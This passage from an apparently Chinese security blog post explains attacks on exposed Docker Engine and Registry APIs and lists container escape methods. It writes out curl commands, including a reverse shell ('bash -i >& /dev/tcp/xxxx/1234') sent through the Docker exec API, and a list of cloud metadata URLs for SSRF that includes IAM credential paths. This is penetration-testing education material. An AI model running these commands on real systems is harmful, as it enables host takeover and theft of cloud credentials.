<p><code>Docker</code> 使用了 <code>C/S</code> 体系架构，<code>Docker client</code> 客户端与 <code>Docker daemon</code> 守护进程服务端通信，<code>Docker</code> 守护进程负责构建，运行和分发 <code>Docker</code> 容器。<code>Docker</code> 客户端和守护进程可以在同一个系统上运行，也可以将 <code>Docker</code> 客户端连接到远程<code>Docker</code> 守护进程。</p>
<h3 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker API"></a>Docker API</h3><p><code>Docker API</code> 遵循 <code>RESTful API</code> 标准（基于 HTTP 协议），可由 HTTP 客户端（如 wget 或 curl）或作为大多数现代编程语言的 HTTP 库访问，官方提供的主要有三大 API：</p>
<pre><code>Docker Engine API     # https://docs.docker.com/engine/api/
Docker Hub API        # https://docs.docker.com/docker-hub/api/latest/
Docker Registry API   # https://docs.docker.com/registry/spec/api/</code></pre><h4 id="Engine-API"><a href="#Engine-API" class="headerlink" title="Engine API"></a>Engine API</h4><p><code>Docker</code> 提供了一个用于与 <code>Docker</code> 守护进程进行交互的 <a href="https://docs.docker.com/engine/api/" target="_blank" rel="noopener">API</a>（称为 <code>Docker Engine API</code>）。 <code>Docker Engine API</code> 个版本 HTTP 接口详情见官网 <a href="https://docs.docker.com/engine/api/" target="_blank" rel="noopener">Engine API reference </a> </p>
<p><code>Docker Client</code> 与 <code>Docker Server</code>（<code>Docker daemon</code>）的连接方式主要是通过 <code>Socket</code> 进行连接，<code>Docker daemon</code> 支持如下三种不同类型的 <code>Socket</code></p>
<pre><code>unix:///var/run/docker.sock
tcp://host:port
fd://socketfd</code></pre><p><code>Docker daemon</code> 默认监听 <code>unix:///var/run/docker.sock</code> ，也可以通过 <code>-H</code> 参数设置监听其它 <code>unix socket</code> 或 <code>tcp socket</code> 等</p>
<p>针对 <code>tcp socket</code> 通信，<code>Docker daemon</code> 监听端口 <code>2375 or 2376</code> （<code>2375</code> 用于 http 通信不存在认证、<code>2376</code> 用于 https 通信存在认证）负责接收来自 <code>Docker Engine API</code> 的请求并处理。如果 <code>Docker daemon</code> 通信配置了 <code>-H tcp://host:2375</code> 将 <code>2375</code> 未授权端口暴露在公网上，则可以利用 <code>API</code> 未授权接管该 <code>Docker</code> 服务，并通过创建特权容器等手段逃逸控制宿主机。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># verify</span>
docker -H tcp://docker_daemon_ip:2375 version
or
curl -X GET http://docker_daemon_ip:2375/version
curl -X GET http://docker_daemon_ip:2375/info
curl -X GET http://docker_daemon_ip:2375/containers/json
curl -X POST http://docker_daemon_ip:2375/containers/create -H <span class="token string">"Content-Type: application/json"</span> -d <span class="token string">'{"Image": "alpine", "Cmd": ["echo", "hello world"]}'</span>
curl -X POST http://docker_daemon_ip:2375/containers/<span class="token punctuation">{</span>container_id<span class="token punctuation">}</span>/exec -H <span class="token string">"Content-Type: application/json"</span> -d <span class="token string">'{"Cmd": ["bash", "-c", "bash -i >&amp; /dev/tcp/xxxx/1234 0>&amp;1"]}'</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.

<span class="token comment" spellcheck="true"># attack</span>
docker -H tcp://host:2375 <span class="token function">exec</span> <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t<span class="token punctuation">]</span> 容器名 <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span> <span class="token punctuation">[</span>ARG<span class="token punctuation">..</span>.<span class="token punctuation">]</span>

<span class="token comment" spellcheck="true"># exp</span>
https://github.com/Tycx2ry/docker_api_vul<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>针对 <code>unix socket</code> 通信，<code>Docker daemon</code> 监听 <code>/xxx/docker.sock</code>（默认为：<code>/var/run/docker.sock</code>）。如果一台容器一定程度上可控（<code>RCE</code>、<code>SSRF</code> 等）并存在 <code>docker.sock</code>【启动容器时挂载不当（e.g: <code>-v /var/run/:/host/var/run/</code>），导致容器可访问<code>docker.sock</code>】，则可以利用该 <code>docker.sock</code> 文件控制 <code>Docker daemon</code> 接管 <code>Docker</code> </p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># verify</span>
docker -H unix:///var/run/docker.sock version
or
curl --unix-socket /var/run/docker.sock -X GET http://docker_daemon_ip/version
curl --unix-socket /var/run/docker.sock -X GET http://docker_daemon_ip/info
curl --unix-socket /var/run/docker.sock -X GET http://docker_daemon_ip/containers/json
curl --unix-socket /var/run/docker.sock -X POST http://docker_daemon_ip/containers/create -H <span class="token string">"Content-Type: application/json"</span> -d <span class="token string">'{"Image": "alpine", "Cmd": ["echo", "hello world"]}'</span>
curl --unix-socket /var/run/docker.sock -X POST http://docker_daemon_ip/containers/<span class="token punctuation">{</span>container_id<span class="token punctuation">}</span>/exec -H <span class="token string">"Content-Type: application/json"</span> -d <span class="token string">'{"Cmd": ["bash", "-c", "bash -i >&amp; /dev/tcp/xxxx/1234 0>&amp;1"]}'</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.

<span class="token comment" spellcheck="true"># attack</span>
docker -H unix:///var/run/docker.sock <span class="token function">exec</span> <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token punctuation">[</span>-i<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t<span class="token punctuation">]</span> 容器名 <span class="token punctuation">[</span>COMMAND<span class="token punctuation">]</span> <span class="token punctuation">[</span>ARG<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Registry-API"><a href="#Registry-API" class="headerlink" title="Registry API"></a>Registry API</h4><p>Docker Registry 中可以包含多个仓库（<code>Repository</code>）；每个仓库可以包含多个标签（<code>Tag</code>）；每个标签对应一个镜像。</p>
<p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p>
<p>开源的 Docker Registry 镜像只提供了 <a href="https://docs.docker.com/registry/spec/api/" target="_blank" rel="noopener">Docker Registry API</a> 的服务端实现，允许用户使用 HTTP API 控制（增、删、改、查等） Docker 仓库。Docker Registry API 主要分为 V1 和 V2 版本，现在主要使用的都是 V2 版本，V2 API 接口主要如下</p>
<table>
<thead>
<tr>
<th>method</th>
<th align="center">path</th>
<th align="center">Entity</th>
<th align="center">Description</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td align="center"><code>/v2</code></td>
<td align="center">Base</td>
<td align="center">Check that the endpoint implements Docker Registry API V2.</td>
</tr>
<tr>
<td>GET</td>
<td align="center"><code>/v2/&lt;image&gt;/tags/list</code></td>
<td align="center">Tags</td>
<td align="center">Fetch the tags under the repository identified by name.</td>
</tr>
<tr>
<td>GET</td>
<td align="center"><code>/v2/&lt;image&gt;/manifests/&lt;referevce&gt;</code></td>
<td align="center">Manifest</td>
<td align="center">Fetch the manifest identified by nameand referencewhere referencecan be a tag or digest. A HEADrequest can also be issued to this endpoint to obtain resource information without receiving all data.</td>
</tr>
<tr>
<td>put</td>
<td align="center"><code>/v2/&lt;image&gt;/manifests/&lt;referevce&gt;</code></td>
<td align="center">Manifest</td>
<td align="center">Put the manifest identified by nameand referencewhere referencecan be a tag or digest.</td>
</tr>
<tr>
<td>delete</td>
<td align="center"><code>/v2/&lt;image&gt;/manifests/&lt;reference&gt;</code></td>
<td align="center">Manifest</td>
<td align="center">Delete the manifest identified by nameand reference. Note that a manifest can only be deleted by digest.</td>
</tr>
<tr>
<td>GET</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/&lt;digest&gt;</code></td>
<td align="center">Blob</td>
<td align="center">Retrieve the blob from the registry identified bydigest. A HEADrequest can also be issued to this endpoint to obtain resource information without receiving all data.</td>
</tr>
<tr>
<td>DELETE</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/&lt;digest&gt;</code></td>
<td align="center">Blob</td>
<td align="center">Delete the blob identified by nameand digest</td>
</tr>
<tr>
<td>POST</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/uploads/</code></td>
<td align="center">Initiate Blob Upload</td>
<td align="center">Initiate a resumable blob upload. If successful, an upload location will be provided to complete the upload. Optionally, if thedigest parameter is present, the request body will be used to complete the upload in a single request.</td>
</tr>
<tr>
<td>GET</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/uploads/&lt;uuid&gt;</code></td>
<td align="center">Blob Upload</td>
<td align="center">Retrieve status of upload identified byuuid. The primary purpose of this endpoint is to resolve the current status of a resumable upload.</td>
</tr>
<tr>
<td>PATCH</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/uploads/&lt;uuid&gt;</code></td>
<td align="center">Blob Upload</td>
<td align="center">Upload a chunk of data for the specified upload.</td>
</tr>
<tr>
<td>PUT</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/uploads/&lt;uuid&gt;</code></td>
<td align="center">Blob Upload</td>
<td align="center">Complete the upload specified by uuid, optionally appending the body as the final chunk.</td>
</tr>
<tr>
<td>DELETE</td>
<td align="center"><code>/v2/&lt;image&gt;/blobs/uploads/&lt;uuid&gt;</code></td>
<td align="center">Blob Upload</td>
<td align="center">Cancel outstanding upload processes, releasing associated resources. If this is not called, the unfinished uploads will eventually timeout.</td>
</tr>
<tr>
<td>GET</td>
<td align="center"><code>/v2/_catalog</code></td>
<td align="center">Catalog</td>
<td align="center">Retrieve a sorted, json list of repositories available in the registry.</td>
</tr>
</tbody></table>
<p>默认情况下 Docker Registry API 未启用身份验证，如果 Registry API  暴露在公网且不存在认证，则可以通过 Docker Registry API 未授权接管 Docker Registry 仓库</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># verify</span>
http://<span class="token punctuation">{</span>host<span class="token punctuation">}</span>:<span class="token punctuation">{</span>port<span class="token punctuation">}</span>/v1/_catalog
or
http://<span class="token punctuation">{</span>host<span class="token punctuation">}</span>:<span class="token punctuation">{</span>port<span class="token punctuation">}</span>/v2/_catalog

<span class="token comment" spellcheck="true"># attack</span>
<span class="token comment" spellcheck="true"># exp: download image</span>
https://github.com/NotSoSecure/docker_fetch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注：第三方常见图形化 Docker Registry API 的实现有 Harbor(Vmware)、Nexus(Sonatype) 等</p>
<h3 id="Docker-Escape"><a href="#Docker-Escape" class="headerlink" title="Docker Escape"></a>Docker Escape</h3><p><code>Kubernetes</code> 集群容器 <code>Container</code> 常见逃逸手法如下： </p>
<ul>
<li><p><code>privileged</code> 特权容器内 <code>mount device</code></p>
<ul>
<li>沦陷的容器本身以特权模式启动</li>
<li><code>Kube API Server</code> 创建特权容器挂载逃逸 (可利用 <code>Kubernetes</code> 集群 <code>Pod</code> 间的亲和性和反亲和性、污点和容忍度等特性逃逸至特定 <code>Node</code> 节点 )</li>
<li>沦陷的容器具有高权限 <code>Service Account</code> 直接访问 <code>Kube api server</code> </li>
</ul>
</li>
<li><p>攻击 <code>lxcfs</code></p>
</li>
<li><p>创建 <code>cgroup</code> 进行容器逃逸</p>
</li>
<li><p>特殊路径挂载导致的容器逃逸 (<code>/、/etc/、/proc/、/root/.ssh、/var/run/、/var/log/</code>)</p>
<ul>
<li><code>/etc/crontab、/root/.ssh/</code> 等文件修改，逃逸容器执行任意命令</li>
<li>利用 <code>/var/run/docker.sock</code> 访问控制 <code>Docker daemon</code> 接管 <code>Docker</code> </li>
<li><code>/proc/sys/kernel/core_pattern</code> 修改逃逸</li>
<li>利用挂载的 <code>/var/log/</code> 、容器为 <code>root</code> 权限、当前 <code>pod</code> 的 <code>service account</code> 拥有 <code>get、list、watch</code> <code>log</code> (访问<code>kubelet logs api</code>)的权限进行逃逸</li>
</ul>
</li>
<li><p><code>Subpath Volume Vulnerability in Kubernetes (CVE-2017-1002101)</code></p>
</li>
<li><p><code>SYS_PTRACE</code> 安全风险</p>
</li>
<li><p><code>runc CVE-2019-5736</code></p>
</li>
<li><p><code>CVE-2020-15257</code></p>
</li>
<li><p>内核漏洞提权和逃逸</p>
<ul>
<li><code>CVE-2016-5195</code></li>
<li><code>CVE-2020-14386</code></li>
<li><code>DirtyPipe</code></li>
</ul>
</li>
</ul>
<p>注：推荐一款针对容器环境定制的渗透测试工具：<a href="https://github.com/cdk-team/CDK" target="_blank" rel="noopener">https://github.com/cdk-team/CDK</a></p>
<h2 id="Attack-Cloud-with-SSRF"><a href="#Attack-Cloud-with-SSRF" class="headerlink" title="Attack Cloud with SSRF"></a>Attack Cloud with SSRF</h2><p>SSRF (Server-Side Request Forgery：服务器端请求伪造) 是一种由攻击者构造特定 <code>Payload</code> 利用服务端发起请求的一个安全漏洞。SSRF 形成的原因主要为服务端提供了对外发起请求的功能且没有对目标地址做过滤与限制。</p>
<p>随着云原生环境的覆盖，SSRF 漏洞利用不在局限，主要分为传统环境与云环境下的攻击面：</p>
<p>（1）传统环境中，SSRF 主要作用为突破网络边界、攻击内网应用</p>
<ul>
<li>敏感信息获取（e.g: wiki …..）</li>
<li>内网信息探测（e.g: host、port …..）</li>
<li>内网应用攻击（e.g: redis、strust …..）</li>
</ul>
<p>（2）云环境中，SSRF 主要作用为攻击云上资产</p>
<ul>
<li>攻击元数据（Metadata, e.g: AK、SK …..）</li>
<li>攻击集群引擎（e.g: Kubernetes API、Kubelet API、Docker API …..）</li>
<li>攻击集群数据库（e.g: Etcd、Zookeeper、Consul …..）</li>
</ul>
<p>注：云环境下攻击元数据，针对不同云厂商回环地址如下</p>
<pre><code>## Alibaba Cloud
# https://help.aliyun.com/document_detail/108460.html
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id


## Tencent Cloud
# https://cloud.tencent.com/document/product/213/4934
http://metadata.tencentyun.com/latest/user-data
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/instance-id
http://metadata.tencentyun.com/latest/meta-data/placement/zone
http://metadata.tencentyun.com/latest/meta-data/placement/region


## JD CLOUD
# https://docs.jdcloud.com/cn/virtual-machines/instance-metadata
http://169.254.169.254/metadata/latest/
http://169.254.169.254/metadata/latest/attributes/hostname
http://169.254.169.254/metadata/latest/instance-id


## AWS (Amazon)
# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
http://169.254.169.254/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key


## Google Cloud
#  https://cloud.google.com/compute/docs/metadata
#  Requires the header &quot;Metadata-Flavor: Google&quot; or &quot;X-Google-Metadata-Request: True&quot;
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
http://metadata.google.internal/computeMetadata/v1beta1/
http://169.254.169.254/computeMetadata/v1/
http://metadata/computeMetadata/v1/


## Digital Ocean
# https://developers.digitalocean.com/documentation/metadata/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address


## Packetcloud
https://metadata.packet.net/userdata


## Azure (Microsoft)
#  Limited, maybe more exist?
# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance
# Update Apr 2017, Azure has more support; requires the header &quot;Metadata: true&quot;
# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=&lt;version&gt;
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=&lt;version&gt;&amp;format=text
http://169.254.169.254/metadata/instance/compute?api-version=&lt;version&gt;


## OpenStack/RackSpace 
http://169.254.169.254/openstack/latest/user_data
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/network_data.json
http://169.254.169.254/openstack/latest/securitykey


## Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/</code></pre><h1 id="Kubernetes-Hardening"><a href="#Kubernetes-Hardening" class="headerlink" title="Kubernetes Hardening"></a>Kubernetes Hardening</h1><p>Kubernetes API 访问安全加固：<a href="https://goteleport.com/blog/kubernetes-api-access-security" target="_blank" rel="noopener">https://goteleport.com/blog/kubernetes-api-access-security</a></p>
<ul>
<li>权限管控（启动、配置、账户等）</li>
<li>认证凭据加密存储</li>
<li>禁止匿名访问、添加认证</li>
<li>……</li>
</ul>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://kubernetes.io/" target="_blank" rel="noopener">https://kubernetes.io/</a></p>
<p><a href="https://kubernetes.feisky.xyz/" target="_blank" rel="noopener">https://kubernetes.feisky.xyz/</a></p>
<p><a href="https://medium.com/swlh/kubernetes-attack-path-part-1-discovery-initial-access-771365e21b58" target="_blank" rel="noopener">https://medium.com/swlh/kubernetes-attack-path-part-1-discovery-initial-access-771365e21b58</a></p>
<p><a href="https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d" target="_blank" rel="noopener">https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d</a></p>
<p><a href="https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster" target="_blank" rel="noopener">https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster</a></p>
<p><a href="https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/" target="_blank" rel="noopener">https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/</a></p>
<p><a href="https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface" target="_blank" rel="noopener">https://www.optiv.com/insights/source-zero/blog/kubernetes-attack-surface</a></p>
<p><a href="https://docs.docker.com/engine/api/" target="_blank" rel="noopener">https://docs.docker.com/engine/api/</a></p>
<p><a href="https://docs.docker.com/registry/spec/api/" target="_blank" rel="noopener">https://docs.docker.com/registry/spec/api/</a></p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://Qftm.github.io/2021/08/15/Kubernetes-Security/">http://Qftm.github.io/2021/08/15/Kubernetes-Security/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Qftm</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Cloud/">
                                    <span class="chip bg-color">Cloud</span>
                                </a>
                            
                                <a href="/tags/Kubernetes/">
                                    <span class="chip bg-color">Kubernetes</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2022/05/29/Java-JVM-JNI/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/JNI.jpg" class="responsive-img" alt="Java安全详谈-JNI 底层分析">
                        
                        <span class="card-title">Java安全详谈-JNI 底层分析</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            JNI (Java Native Interface，JAVA 本地接口) 允许 Java 代码和其它编程语言编写的代码进行交互，主要为Java和Native层（C/C++）相互调用的接口规范
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-29
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
                                    Java安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Java/">
                        <span class="chip bg-color">Java</span>
                    </a>
                    
                    <a href="/tags/JNI/">
                        <span class="chip bg-color">JNI</span>
                    </a>
                    
                    <a href="/tags/JVM/">
                        <span class="chip bg-color">JVM</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/12/01/command-execution-research-php/">
                    <div class="card-image">
                        
                        <img src="/medias/featureimages/code-6.png" class="responsive-img" alt="命令执行底层原理探究-PHP">
                        
                        <span class="card-title">命令执行底层原理探究-PHP</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            针对不同平台/语言下的命令执行是不相同的，存在很大的差异性。因此，这里对不同平台/语言下的命令执行函数进行深入的探究分析。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-01
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/PHP%E5%AE%89%E5%85%A8/" class="post-category">
                                    PHP安全
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/PHP/">
                        <span class="chip bg-color">PHP</span>
                    </a>
                    
                    <a href="/tags/%E5%86%85%E6%A0%B8/">
                        <span class="chip bg-color">内核</span>
                    </a>
                    
                    <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
                        <span class="chip bg-color">命令执行</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'From: Qftm<br />'
            + 'Author: Qftm<br />'
            + 'Link: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2018</span>
            <a href="/about" target="_blank">Qftm</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">370.8k</span>&nbsp;字
            
            
            
            
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/Qftm" 
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:Qftmbin@gmail.com" 
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Qftmer" 
        <i class="fab fa-twitter"></i>
    </a>









</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
